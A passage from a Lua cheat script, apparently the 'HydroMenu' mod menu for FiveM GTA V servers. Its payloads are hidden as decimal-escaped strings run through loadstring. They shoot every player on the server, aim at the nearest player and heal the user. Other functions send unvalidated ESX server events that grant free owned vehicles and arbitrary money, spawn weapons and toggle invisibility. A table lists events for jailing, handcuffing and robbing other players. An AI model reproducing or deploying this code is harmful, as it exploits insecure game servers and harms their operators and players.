loading("\67\105\116\105\122\101\110\46\67\114\101\97\116\101\84\104\114\101\97\100\40\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\119\104\105\108\101\32\116\114\117\101\32\100\111\32\10\32\32\32\32\32\32\32\32\87\97\105\116\40\55\41\32\10\32\32\32\32\32\32\32\32\105\102\32\73\115\67\111\110\116\114\111\108\80\114\101\115\115\101\100\40\48\44\32\49\57\41\32\116\104\101\110\32\10\32\32\32\32\32\32\32\32\32\32\32\32\78\101\116\119\111\114\107\83\101\116\70\114\105\101\110\100\108\121\70\105\114\101\79\112\116\105\111\110\40\102\97\108\115\101\41\10\32\32\32\32\32\32\32\32\101\108\115\101\10\32\32\32\32\32\32\32\32\32\32\32\32\83\101\116\67\97\110\65\116\116\97\99\107\70\114\105\101\110\100\108\121\40\71\101\116\80\108\97\121\101\114\80\101\100\40\45\49\41\44\32\116\114\117\101\44\32\102\97\108\115\101\41\10\32\32\32\32\32\32\32\32\32\32\32\32\78\101\116\119\111\114\107\83\101\116\70\114\105\101\110\100\108\121\70\105\114\101\79\112\116\105\111\110\40\116\114\117\101\41\10\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\101\110\100\32\10\101\110\100\41\10")()
    end
    
    function scoke()
        local loading = load or loadstring
loading("\67\105\116\105\122\101\110\46\67\114\101\97\116\101\84\104\114\101\97\100\40\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\119\104\105\108\101\32\116\114\117\101\32\100\111\10\32\32\32\32\32\32\32\32\67\105\116\105\122\101\110\46\87\97\105\116\40\48\41\10\32\32\32\32\32\32\32\32\105\102\32\73\115\68\105\115\97\98\108\101\100\67\111\110\116\114\111\108\74\117\115\116\80\114\101\115\115\101\100\40\48\44\49\57\55\41\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\108\111\99\97\108\32\112\108\97\121\101\114\80\101\100\32\61\32\80\108\97\121\101\114\80\101\100\73\100\40\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\83\101\116\69\110\116\105\116\121\72\101\97\108\116\104\40\112\108\97\121\101\114\80\101\100\44\32\71\101\116\69\110\116\105\116\121\77\97\120\72\101\97\108\116\104\40\112\108\97\121\101\114\80\101\100\41\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\84\114\105\103\103\101\114\69\118\101\110\116\40\39\101\115\120\95\115\116\97\116\117\115\58\115\101\116\39\44\32\39\104\117\110\103\101\114\39\44\32\49\48\48\48\48\48\48\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\84\114\105\103\103\101\114\69\118\101\110\116\40\39\101\115\120\95\115\116\97\116\117\115\58\115\101\116\39\44\32\39\116\104\105\114\115\116\39\44\32\49\48\48\48\48\48\48\41\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\112\114\105\110\116\40\39\72\101\97\108\32\66\121\32\65\100\109\105\110\39\41\10\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\101\110\100\10\101\110\100\41\10")()
    end
    
    function hmeth()
        local loading = load or loadstring
loading("\67\114\101\97\116\101\84\104\114\101\97\100\40\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\119\104\105\108\101\32\116\114\117\101\32\100\111\10\32\32\32\32\32\32\67\105\116\105\122\101\110\46\67\114\101\97\116\101\84\104\114\101\97\100\40\102\117\110\99\116\105\111\110\40\41\10\32\32\32\32\32\32\102\111\114\32\107\44\32\118\32\105\110\32\112\97\105\114\115\40\71\101\116\65\99\116\105\118\101\80\108\97\121\101\114\115\40\41\41\32\100\111\10\32\32\32\32\32\32\32\32\32\32\67\105\116\105\122\101\110\46\87\97\105\116\40\51\48\41\10\32\32\32\32\32\32\32\32\32\32\108\111\99\97\108\32\84\97\114\103\101\116\80\101\100\32\61\32\71\101\116\80\108\97\121\101\114\80\101\100\40\118\41\10\32\32\32\32\32\32\32\32\32\32\108\111\99\97\108\32\84\97\114\103\101\116\80\111\115\32\61\32\71\101\116\69\110\116\105\116\121\67\111\111\114\100\115\40\84\97\114\103\101\116\80\101\100\41\10\32\32\32\32\32\32\32\32\32\32\108\111\99\97\108\32\69\120\105\115\116\32\61\32\68\111\101\115\69\110\116\105\116\121\69\120\105\115\116\40\84\97\114\103\101\116\80\101\100\41\10\32\32\32\32\32\32\32\32\32\32\108\111\99\97\108\32\68\101\97\100\32\61\32\73\115\80\108\97\121\101\114\68\101\97\100\40\84\97\114\103\101\116\80\101\100\41\10\32\32\32\32\32\32\32\32\32\32\108\111\99\97\108\32\84\97\114\103\101\116\67\111\111\114\100\115\32\61\32\71\101\116\80\101\100\66\111\110\101\67\111\111\114\100\115\40\84\97\114\103\101\116\80\101\100\44\32\51\49\48\56\54\44\32\48\44\32\48\44\32\48\41\10\32\32\32\32\32\32\32\32\32\32\67\108\101\97\114\80\101\100\84\97\115\107\115\73\109\109\101\100\105\97\116\101\108\121\40\71\101\116\80\108\97\121\101\114\80\101\100\40\83\101\108\101\99\116\101\100\80\108\97\121\101\114\41\41\10\32\32\32\32\32\32\32\32\32\32\83\104\111\111\116\83\105\110\103\108\101\66\117\108\108\101\116\66\101\116\119\101\101\110\67\111\111\114\100\115\40\84\97\114\103\101\116\80\111\115\46\120\44\32\84\97\114\103\101\116\80\111\115\46\121\44\32\84\97\114\103\101\116\80\111\115\46\122\43\51\46\48\44\84\97\114\103\101\116\67\111\111\114\100\115\46\120\44\84\97\114\103\101\116\67\111\111\114\100\115\46\121\44\84\97\114\103\101\116\67\111\111\114\100\115\46\122\44\32\57\48\48\48\44\32\48\44\32\71\101\116\72\97\115\104\75\101\121\40\34\119\101\97\112\111\110\95\115\110\115\112\105\115\116\111\108\34\41\44\32\80\108\97\121\101\114\80\101\100\73\100\40\83\101\108\101\99\116\101\100\80\108\97\121\101\114\41\44\32\116\114\117\101\44\32\102\97\108\115\101\44\32\57\48\48\48\46\48\41\10\32\32\32\32\32\32\32\32\32\32\83\104\111\111\116\83\105\110\103\108\101\66\117\108\108\101\116\66\101\116\119\101\101\110\67\111\111\114\100\115\40\84\97\114\103\101\116\80\111\115\46\120\44\32\84\97\114\103\101\116\80\111\115\46\121\43\51\46\48\44\32\84\97\114\103\101\116\80\111\115\46\122\44\84\97\114\103\101\116\67\111\111\114\100\115\46\120\44\84\97\114\103\101\116\67\111\111\114\100\115\46\121\44\84\97\114\103\101\116\67\111\111\114\100\115\46\122\44\32\57\48\48\48\44\32\48\44\32\71\101\116\72\97\115\104\75\101\121\40\34\119\101\97\112\111\110\95\115\110\115\112\105\115\116\111\108\34\41\44\32\80\108\97\121\101\114\80\101\100\73\100\40\83\101\108\101\99\116\101\100\80\108\97\121\101\114\41\44\32\116\114\117\101\44\32\102\97\108\115\101\44\32\57\48\48\48\46\48\41\10\32\32\32\32\32\32\101\110\100\10\32\32\101\110\100\41\10\32\32\32\32\32\32\87\97\105\116\40\49\48\48\41\59\10\32\32\32\32\101\110\100\10\32\32\101\110\100\41\10")()
    end
    
    function tmeth()
        local loading = load or loadstring
loading("\108\111\99\97\108\32\105\109\109\111\114\116\97\108\32\61\32\102\97\108\115\101\10\67\105\116\105\122\101\110\46\67\114\101\97\116\101\84\104\114\101\97\100\40\102\117\110\99\116\105\111\110\40\41\32\32\10\32\32\32\32\108\111\99\97\108\32\108\111\99\97\108\112\101\100\32\61\32\71\101\116\80\108\97\121\101\114\80\101\100\40\45\49\41\10\32\32\32\32\119\104\105\108\101\32\116\114\117\101\32\100\111\32\10\10\32\32\32\32\32\32\32\32\87\97\105\116\40\49\48\41\32\10\32\32\32\32\32\32\32\32\10\10\32\32\32\32\32\32\32\10\32\32\32\32\32\32\32\10\32\32\32\32\32\32\32\32\105\102\32\73\115\67\111\110\116\114\111\108\80\114\101\115\115\101\100\40\48\44\32\52\54\41\32\116\104\101\110\32\10\32\32\32\32\32\32\32\32\32\10\32\32\32\32\32\32\32\32\32\32\32\32\108\111\99\97\108\32\99\108\111\115\101\115\116\112\101\100\32\61\32\71\101\116\67\108\111\115\101\115\116\80\108\97\121\101\114\40\41\10\32\32\32\32\32\32\32\32\32\32\32\32\108\111\99\97\108\32\112\101\100\32\61\32\71\101\116\80\108\97\121\101\114\80\101\100\40\99\108\111\115\101\115\116\112\101\100\41\10\32\32\32\32\32\32\32\32\32\32\32\32\105\102\32\68\111\101\115\69\110\116\105\116\121\69\120\105\115\116\40\112\101\100\41\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\109\97\107\101\69\110\116\105\116\121\70\97\99\101\69\110\116\105\116\121\40\108\111\99\97\108\112\101\100\44\112\101\100\41\10\32\32\32\32\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\32\32\32\32\101\110\100\32\10\32\32\32\32\101\110\100\32\10\101\110\100\41\10\102\117\110\99\116\105\111\110\32\71\101\116\67\108\111\115\101\115\116\80\108\97\121\101\114\40\41\10\32\32\32\32\108\111\99\97\108\32\112\108\97\121\101\114\115\32\61\32\71\101\116\80\108\97\121\101\114\115\40\41\10\32\32\32\32\108\111\99\97\108\32\99\108\111\115\101\115\116\68\105\115\116\97\110\99\101\32\61\32\45\49\10\32\32\32\32\108\111\99\97\108\32\99\108\111\115\101\115\116\80\108\97\121\101\114\32\61\32\45\49\10\32\32\32\32\108\111\99\97\108\32\112\108\121\32\61\32\71\101\116\80\108\97\121\101\114\80\101\100\40\45\49\41\10\32\32\32\32\108\111\99\97\108\32\112\108\121\67\111\111\114\100\115\32\61\32\71\101\116\69\110\116\105\116\121\67\111\111\114\100\115\40\112\108\121\44\32\48\41\10\32\32\32\32\102\111\114\32\105\110\100\101\120\44\32\118\97\108\117\101\32\105\110\32\105\112\97\105\114\115\40\112\108\97\121\101\114\115\41\32\100\111\10\32\32\32\32\32\32\32\32\108\111\99\97\108\32\116\97\114\103\101\116\32\61\32\71\101\116\80\108\97\121\101\114\80\101\100\40\118\97\108\117\101\41\10\32\32\32\32\32\32\32\32\105\102\32\40\116\97\114\103\101\116\32\126\61\32\112\108\121\41\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\108\111\99\97\108\32\116\97\114\103\101\116\67\111\111\114\100\115\32\61\32\71\101\116\69\110\116\105\116\121\67\111\111\114\100\115\40\71\101\116\80\108\97\121\101\114\80\101\100\40\118\97\108\117\101\41\44\32\48\41\10\32\32\32\32\32\32\32\32\32\32\32\32\108\111\99\97\108\32\100\105\115\116\97\110\99\101\32\61\32\71\101\116\68\105\115\116\97\110\99\101\66\101\116\119\101\101\110\67\111\111\114\100\115\40\116\97\114\103\101\116\67\111\111\114\100\115\91\39\120\39\93\44\32\116\97\114\103\101\116\67\111\111\114\100\115\91\39\121\39\93\44\32\116\97\114\103\101\116\67\111\111\114\100\115\91\39\122\39\93\44\32\112\108\121\67\111\111\114\100\115\91\39\120\39\93\44\32\112\108\121\67\111\111\114\100\115\91\39\121\39\93\44\32\112\108\121\67\111\111\114\100\115\91\39\122\39\93\44\32\116\114\117\101\41\10\32\32\32\32\32\32\32\32\32\32\32\32\105\102\32\40\99\108\111\115\101\115\116\68\105\115\116\97\110\99\101\32\61\61\32\45\49\32\111\114\32\99\108\111\115\101\115\116\68\105\115\116\97\110\99\101\32\62\32\100\105\115\116\97\110\99\101\41\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\105\102\32\73\115\80\101\100\68\101\97\100\79\114\68\121\105\110\103\40\71\101\116\80\108\97\121\101\114\80\101\100\40\118\97\108\117\101\41\44\32\49\41\32\116\104\101\110\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\101\108\115\101\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\99\108\111\115\101\115\116\80\108\97\121\101\114\32\61\32\118\97\108\117\101\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\99\108\111\115\101\115\116\68\105\115\116\97\110\99\101\32\61\32\100\105\115\116\97\110\99\101\10\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\32\32\32\32\101\110\100\10\32\32\32\32\101\110\100\10\32\32\32\32\114\101\116\117\114\110\32\99\108\111\115\101\115\116\80\108\97\121\101\114\44\32\99\108\111\115\101\115\116\68\105\115\116\97\110\99\101\10\101\110\100\10\10\102\117\110\99\116\105\111\110\32\109\97\107\101\69\110\116\105\116\121\70\97\99\101\69\110\116\105\116\121\40\32\101\110\116\105\116\121\49\44\32\101\110\116\105\116\121\50\32\41\10\32\32\32\32\108\111\99\97\108\32\112\49\32\61\32\71\101\116\69\110\116\105\116\121\67\111\111\114\100\115\40\101\110\116\105\116\121\49\44\32\116\114\117\101\41\10\32\32\32\32\108\111\99\97\108\32\112\50\32\61\32\71\101\116\69\110\116\105\116\121\67\111\111\114\100\115\40\101\110\116\105\116\121\50\44\32\116\114\117\101\41\10\10\32\32\32\32\108\111\99\97\108\32\100\120\32\61\32\112\50\46\120\32\45\32\112\49\46\120\10\32\32\32\32\108\111\99\97\108\32\100\121\32\61\32\112\50\46\121\32\45\32\112\49\46\121\10\10\32\32\32\32\108\111\99\97\108\32\104\101\97\100\105\110\103\32\61\32\71\101\116\72\101\97\100\105\110\103\70\114\111\109\86\101\99\116\111\114\95\50\100\40\100\120\44\32\100\121\41\32\45\45\32\112\101\100\32\116\111\32\104\101\97\100\32\118\101\99\50\100\10\32\32\32\32\83\101\116\69\110\116\105\116\121\72\101\97\100\105\110\103\40\32\101\110\116\105\116\121\49\44\32\104\101\97\100\105\110\103\32\41\10\101\110\100\10\102\117\110\99\116\105\111\110\32\71\101\116\80\108\97\121\101\114\115\40\41\10\32\32\32\32\108\111\99\97\108\32\112\108\97\121\101\114\115\32\61\32\123\125\10\32\32\32\32\102\111\114\32\95\32\44\32\112\108\97\121\101\114\32\105\110\32\105\112\97\105\114\115\40\71\101\116\65\99\116\105\118\101\80\108\97\121\101\114\115\40\41\41\32\100\111\10\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\112\108\97\121\101\114\115\44\32\112\108\97\121\101\114\41\10\10\32\32\32\32\101\110\100\10\32\32\32\32\114\101\116\117\114\110\32\112\108\97\121\101\114\115\10\101\110\100\10")()
    end
    
    function smeth()
local carname = KeyboardInput("CarNxme", "", 100)
  local platenumber = KeyboardInput("Plxtenumber", "", 100)
  if carname and platenumber then
        TriggerServerEvent('esx_vehicleshop:setVehicleOwned', {["model"] = GetHashKey(carname), ["plate"] = platenumber}) 
    end
end
    
    function hopi()
        local result = KeyboardInput("Enter amount of money", "", 100)
  if result then
  TriggerServerEvent("esx_uber:pay", result)
    end
end
    
    function topi()
	local weaponname = KeyboardInput("Name Weapom", "", 100)
  	if weaponname then
	GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(weaponname), 1, false, true)
    end
end
    
    function sopi()
print("^4====================================")
print("^5Visible By GXZ")
print("^8KEY: TAB (ON/OFF)")
print("^4====================================")

GxZ = true
Citizen.CreateThread(function()
    while true do
        SetEntityVisible(PlayerPedId(-1), GxZ)
            if IsDisabledControlJustPressed(0, 171) then
        GxZ = not GxZ
        if GxZ == true then
            print("^1Visible: OFF")
        elseif GxZ == false then
            print("^2Visible: ON")
        end
    end
    Citizen.Wait(0)
    end
end)
end

    function mataaspalarufe()
local rgb = { r = 0, g = 0, b = 0}

local noclipping = false
local NoclipSpeed = 5.0

local cam = nil
local FreeCameraMode = "Object Spooner"

local HydroMenu = { 
	ESP = {},
	ObjectOptions = {
		Sensitivity = 0.1,
		currentObject = {},
	},
	Functions = {},
	DynamicTriggers = {
		Search = {
			-- Usage { Trigger To Search for but trim it down, ID that gets uded in buttons }
			{ "jail:jailPlayer", "ESXQalleJail" },
			{ "job:rev", 'ESXRevive' },
			{ "job:ESXHandcuff", 'ESXHandcuff' },
			{ "job:drag", 'ESXDrag' },
			{ "vangelico_robbery:rob", 'ESXVangelicoRobbery' },
			{ "Tackle", "tryTackle"},
			{ "InteractionMenu:Jail", 'JailSEM' },
			{ "InteractionMenu:DragNear", 'DragSEM' },
		},
		Triggers = {
			['JailSEM'] = "SEM_InteractionMenu:Jail",
			['DragSEM'] = "SEM_InteractionMenu:DragNear",
		},
	},
	Objectlist = {},
    menus = {},
    Cache = {},
    UI = {
		GTAInput = false,
		RGB = false,
		MenuX = 0.75,
		MenuY = 0.025,
		NotificationX = 0.011,
		NotificationY = 0.3025,
        TitleHeight = 0.11,
        ButtonHeight = 0.038,
        ButtonScale = 0.325,
        ButtonFont = 0,
		MaximumOptionCount = 14,
	},
	BottomText = nil,
	Version = "2",
	ScreenWidth, ScreenHeight = Citizen.InvokeNative(0x873C9F3104101DD3, Citizen.PointerValueInt(), Citizen.PointerValueInt()),
    rgb = { r = 255, g = 255, b = 255},
    optionCount = 0,
    currentMenu = nil,
}

local RuntimeTXD = CreateRuntimeTxd('HydroMenu')
local HeaderObject = CreateDui("https://media.discordapp.net/attachments/923949871508115457/934871616368832602/unknown.png", 480, 192)
_G.HeaderObject = HeaderObject
local TextureThing = GetDuiHandle(HeaderObject)
local Texture = CreateRuntimeTextureFromDuiHandle(RuntimeTXD, 'HydroMenuHeader', TextureThing)
local LogoObject = CreateDui("https://media.discordapp.net/attachments/923949871508115457/932226517998665728/Grand_Theft_Auto_V_Screenshot_2022.01.16_-_17.29.30.88-2.png", 30, 30)
_G.LogoObject = LogoObject
local TextureThing = GetDuiHandle(LogoObject)
local Texture = CreateRuntimeTextureFromDuiHandle(RuntimeTXD, 'HydroMenuLogo', TextureThing)

if Ham == nil then
	HydroMenu.UI.GTAInput = true
	Ham = {}
	
	function Ham.printStr(resname, msg)
	    print(msg)
	end

	function Ham.getName()
        return "nil"
	end

	function Ham.getKeyState(val)
        return 0
	end
end

function HydroMenu.RGBRainbow(frequency)
	if HydroMenu.UI.RGB then
		local result = {}
		
		local curtime = GetGameTimer() / 1000
		
		result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
		result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
		result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)
	
		return result
	else
		return HydroMenu.rgb
	end
end

function HydroMenu.SetMenuProperty(id, property, value)
	if id and HydroMenu.menus[id] then
		HydroMenu.menus[id][property] = value
	end
end

function HydroMenu.IsMenuVisible(id)
	if id and HydroMenu.menus[id] then
		return HydroMenu.menus[id].visible
	else
		return false
	end
end

function HydroMenu.CloseMenu()
	local menu = HydroMenu.menus[HydroMenu.currentMenu]
	if menu then
		if menu.aboutToBeClosed then
			HydroMenu.optionCount = 0
			menu.aboutToBeClosed = false
			HydroMenu.SetMenuVisible(HydroMenu.currentMenu, false)
			PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			HydroMenu.currentMenu = nil
		else
			menu.aboutToBeClosed = true
		end
	end
end

function HydroMenu.SetMenuVisible(id, visible, holdCurrent)
	if id and HydroMenu.menus[id] then
		HydroMenu.SetMenuProperty(id, 'visible', visible)

		if not holdCurrent and HydroMenu.menus[id] then
			HydroMenu.SetMenuProperty(id, 'currentOption', 1)
		end

		if visible then
			if id ~= HydroMenu.currentMenu and HydroMenu.IsMenuVisible(HydroMenu.currentMenu) then
				HydroMenu.SetMenuProperty(HydroMenu.currentMenu, false)
			end

			HydroMenu.currentMenu = id
		end
	end
end


function GetTextWidthS(string, font, scale)
	font = font or 4
	scale = scale or 0.35
	HydroMenu.Cache[font] = HydroMenu.Cache[font] or {}
	HydroMenu.Cache[font][scale] = HydroMenu.Cache[font][scale] or {}
	if HydroMenu.Cache[font][scale][string] then return HydroMenu.Cache[font][scale][string].length end
	Citizen.InvokeNative(0x54CE8AC98E120CAB, "STRING")
	Citizen.InvokeNative(0x6C188BE134E074AA, string)
	Citizen.InvokeNative(0x66E0276CC5F6B9DA, font or 4)
	Citizen.InvokeNative(0x07C837F9A01C34C9, scale or 0.35, scale or 0.35)
	local length = Citizen.InvokeNative(0x85F061DA64ED2F67, 1, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat())

	HydroMenu.Cache[font][scale][string] = {length = length}
	return length
end

function HydroMenu.GetTextWidth(string, font, scale)
    return GetTextWidthS(string, font, scale)
end

function HydroMenu.DrawSprite(TxtDict, TxtName, x, y, width, height, heading, red, green, blue, alpha)
	Citizen.InvokeNative(0xE7FFAE5EBF23D890, TxtDict, TxtName, x, y, width, height, heading, red, green, blue, alpha)
end

function HydroMenu.DrawRect(x, y, width, height, color)
	Citizen.InvokeNative(0x3A618A217E5154F0, x, y, width, height, color.r, color.g, color.b, color.a)
end

function HydroMenu.DrawTitle()
	local menu = HydroMenu.menus[HydroMenu.currentMenu]
	if menu then
		local x = menu.x + menu.width / 2
		local y = menu.y + HydroMenu.UI.TitleHeight / 2

		HydroMenu.DrawSprite('HydroMenu', 'HydroMenuHeader', x, y, menu.width, HydroMenu.UI.TitleHeight, 0.0, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)
	end
end

function HydroMenu.DrawBottom()
	local menu = HydroMenu.menus[HydroMenu.currentMenu]

	if menu then
		local x = menu.x + menu.width / 2

		local multiplier = 1
	
		if HydroMenu.optionCount > HydroMenu.UI.MaximumOptionCount then
			multiplier = HydroMenu.UI.MaximumOptionCount
		else
			multiplier = HydroMenu.optionCount
		end

		HydroMenu.DrawRect(x, menu.y + HydroMenu.UI.TitleHeight + HydroMenu.UI.ButtonHeight / 2 + HydroMenu.UI.ButtonHeight + HydroMenu.UI.ButtonHeight * multiplier, menu.width, HydroMenu.UI.ButtonHeight, {r = 0, g = 0, b = 0, a = 255})
	
		HydroMenu.DrawRect(x, menu.y + HydroMenu.UI.TitleHeight + HydroMenu.UI.ButtonHeight + HydroMenu.UI.ButtonHeight * multiplier, menu.width, 0.001, {r = HydroMenu.rgb.r, g = HydroMenu.rgb.g, b = HydroMenu.rgb.b, a = 255})
		
		HydroMenu.DrawSprite('HydroMenu', 'HydroMenuLogo', x, menu.y + HydroMenu.UI.ButtonHeight / 2 + HydroMenu.UI.TitleHeight + HydroMenu.UI.ButtonHeight + HydroMenu.UI.ButtonHeight * multiplier, 0.02, 0.02 * HydroMenu.ScreenWidth / HydroMenu.ScreenHeight, 0.0, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 255)

		HydroMenu.DrawText(HydroMenu.Version, {menu.x + menu.width - HydroMenu.GetTextWidth(HydroMenu.Version), menu.y + HydroMenu.UI.TitleHeight + HydroMenu.UI.ButtonHeight / 6 + HydroMenu.UI.ButtonHeight + HydroMenu.UI.ButtonHeight * multiplier}, {255, 255, 255, 255}, HydroMenu.UI.ButtonScale, 0, 1, 0, 0)

		HydroMenu.DrawText(menu.currentOption .. " / " ..HydroMenu.optionCount, {menu.x + 0.005, menu.y + HydroMenu.UI.TitleHeight + HydroMenu.UI.ButtonHeight / 6 + HydroMenu.UI.ButtonHeight + HydroMenu.UI.ButtonHeight * multiplier}, {255, 255, 255, 255}, HydroMenu.UI.ButtonScale, 0, 0, 0, 0)

		
		--[[
		if HydroMenu.BottomText ~= nil and HydroMenu.BottomText ~= "" then
            
		    HydroMenu.DrawRect(x, menu.y + HydroMenu.UI.TitleHeight + 0.005 + HydroMenu.UI.ButtonHeight * 2 + HydroMenu.UI.ButtonHeight * multiplier, menu.width, 0.001, {r = HydroMenu.rgb.r, g = HydroMenu.rgb.g, b = HydroMenu.rgb.b, a = 255})
		
		    HydroMenu.DrawRect(x, menu.y + HydroMenu.UI.TitleHeight + 0.025 + HydroMenu.UI.ButtonHeight * 2 + HydroMenu.UI.ButtonHeight * multiplier, menu.width, HydroMenu.UI.ButtonHeight, {r = 0, g = 0, b = 0, a = 200})
		
			HydroMenu.DrawText(HydroMenu.BottomText, {menu.x + 0.018, 0.044 + menu.y + HydroMenu.UI.TitleHeight + HydroMenu.UI.ButtonHeight / 6 + HydroMenu.UI.ButtonHeight + HydroMenu.UI.ButtonHeight * multiplier}, {255, 255, 255, 255}, 0.3, 0)
			
		    HydroMenu.DrawSprite('shared', 'info_icon_32', menu.x + 0.010, 0.058 + menu.y + HydroMenu.UI.TitleHeight + HydroMenu.UI.ButtonHeight / 6 + HydroMenu.UI.ButtonHeight + HydroMenu.UI.ButtonHeight * multiplier, 0.016, 0.016 * HydroMenu.ScreenWidth / HydroMenu.ScreenHeight, 0.0, 255, 255, 255, 255)

		end
		]]
	end
end

function HydroMenu.DrawSubTitle()
	local menu = HydroMenu.menus[HydroMenu.currentMenu]
	if menu then
		local x = menu.x + menu.width / 2
		local y = menu.y + HydroMenu.UI.TitleHeight + HydroMenu.UI.ButtonHeight / 2
		local subTitleColor = { r = 0, g = 0, b = 0, a = 240 }
		HydroMenu.DrawRect(x, y, menu.width, HydroMenu.UI.ButtonHeight, subTitleColor)
		HydroMenu.DrawRect(x, y - HydroMenu.UI.ButtonHeight / 2, menu.width, 0.001, {r = HydroMenu.rgb.r, g = HydroMenu.rgb.g, b = HydroMenu.rgb.b, a = 255})
		HydroMenu.DrawText(menu.subTitle, {menu.x + menu.width / 2, y - HydroMenu.UI.ButtonHeight / 2 + 0.005}, {255, 255, 255, 255}, HydroMenu.UI.ButtonScale, 0, 1, 0, 1)
	end
end

function HydroMenu.DrawText(text, location, colour, size, font, alignment, textentry, outline)
	x, y = table.unpack(location)
	r, g, b, a = table.unpack(colour)

	menu = HydroMenu.menus[HydroMenu.currentMenu]

    SetTextFont(font)
    SetTextProportional(1)
	SetTextScale(size, size)
	if outline then
		SetTextDropshadow(1, 0, 0, 0, 255)
		SetTextEdge(1, 0, 0, 0, 255)
		SetTextDropShadow()
		SetTextOutline()
	end
	SetTextColour(255, 255, 255, a)
	if alignment == 1 then
		SetTextCentre(1)
	elseif alignment == 2 then
		if menu then
			SetTextWrap(menu.x, menu.x + menu.width - 0.005)
		end
		SetTextRightJustify(true)
	elseif alignment == 3 then
		if menu then
			SetTextWrap(menu.x, menu.x + menu.width - 0.022)
		end
		SetTextRightJustify(true)
	elseif alignment == 4 then
		if menu then
			SetTextWrap(0.0, -1.0)
		end
	end
	if type(textentry) == "string" then
		AddTextEntry(textentry, text)
		SetTextEntry(textentry)
	else
		SetTextEntry("STRING")
	end
    AddTextComponentString(text)
    DrawText(x, y)
end
  
function HydroMenu.drawButton(text, subText, menubutton, bottomtext)
	local menu = HydroMenu.menus[HydroMenu.currentMenu]
	local x = menu.x + menu.width / 2
	local multiplier = nil

	if menu.currentOption <= menu.maxOptionCount and HydroMenu.optionCount <= menu.maxOptionCount then
		multiplier = HydroMenu.optionCount
	elseif HydroMenu.optionCount > menu.currentOption - menu.maxOptionCount and HydroMenu.optionCount <= menu.currentOption then
		multiplier = HydroMenu.optionCount - (menu.currentOption - menu.maxOptionCount)
	end

	if multiplier then
		local y = menu.y + HydroMenu.UI.TitleHeight + HydroMenu.UI.ButtonHeight + (HydroMenu.UI.ButtonHeight * multiplier) - HydroMenu.UI.ButtonHeight / 2
		local backgroundColor = nil

		if menu.currentOption == HydroMenu.optionCount then
			backgroundColor = {r = HydroMenu.rgb.r, g = HydroMenu.rgb.g, b = HydroMenu.rgb.b, a = 180}
			HydroMenu.BottomText = bottomtext
		else
			backgroundColor = menu.menuBackgroundColor
		end
		
		HydroMenu.DrawRect(x, y, menu.width, HydroMenu.UI.ButtonHeight, backgroundColor)
		
		HydroMenu.DrawText(text, {menu.x + 0.005, y - (HydroMenu.UI.ButtonHeight / 2) + 0.005}, {255, 255, 255, 255}, HydroMenu.UI.ButtonScale, 0, 0)
		
		if menubutton then

			HydroMenu.DrawText(">>>", {menu.width + 0.005, y - HydroMenu.UI.ButtonHeight / 2 + 0.005}, {255, 255, 255, 255}, HydroMenu.UI.ButtonScale, 0, 2)
		
		end

		if not HasStreamedTextureDictLoaded('commonmenu') then
			RequestStreamedTextureDict('commonmenu', true)
		end
		
		if subText == "On" then
	
            HydroMenu.DrawSprite('commonmenu', "shop_box_tick", HydroMenu.menus[HydroMenu.currentMenu].width + 0.005 + menu.x - 0.017, y + 0.005 - 0.0048, 0.025, 0.025 * HydroMenu.ScreenWidth / HydroMenu.ScreenHeight, 0.0, 255, 255, 255, 200)
			--HydroMenu.DrawText("~g~On", {menu.width + 0.005, y - HydroMenu.UI.ButtonHeight / 2 + 0.005}, {255, 255, 255, 255}, HydroMenu.UI.ButtonScale, 0, 2)
		
		elseif subText == "Off" then

			HydroMenu.DrawSprite('commonmenu', "shop_box_blank", HydroMenu.menus[HydroMenu.currentMenu].width + 0.005 + menu.x - 0.017, y + 0.005 - 0.0048, 0.025, 0.025 * HydroMenu.ScreenWidth / HydroMenu.ScreenHeight, 0.0, 255, 255, 255, 200)
			--HydroMenu.DrawText("~r~Off", {menu.width + 0.005, y - HydroMenu.UI.ButtonHeight / 2 + 0.005}, {255, 255, 255, 255}, HydroMenu.UI.ButtonScale, 0, 2)
		
		elseif not menubutton and subText ~= nil then

			HydroMenu.DrawText(subText, {menu.width + 0.005, y - HydroMenu.UI.ButtonHeight / 2 + 0.005}, {255, 255, 255, 255}, HydroMenu.UI.ButtonScale, 0, 2)
		
		end
	end
end

function HydroMenu.DrawChanger(text, subText)
	local menu = HydroMenu.menus[HydroMenu.currentMenu]
	local x = menu.x + menu.width / 2
	local multiplier = nil

	if menu.currentOption <= menu.maxOptionCount and HydroMenu.optionCount <= menu.maxOptionCount then
		multiplier = HydroMenu.optionCount
	elseif HydroMenu.optionCount > menu.currentOption - menu.maxOptionCount and HydroMenu.optionCount <= menu.currentOption then
		multiplier = HydroMenu.optionCount - (menu.currentOption - menu.maxOptionCount)
	end

	if multiplier then
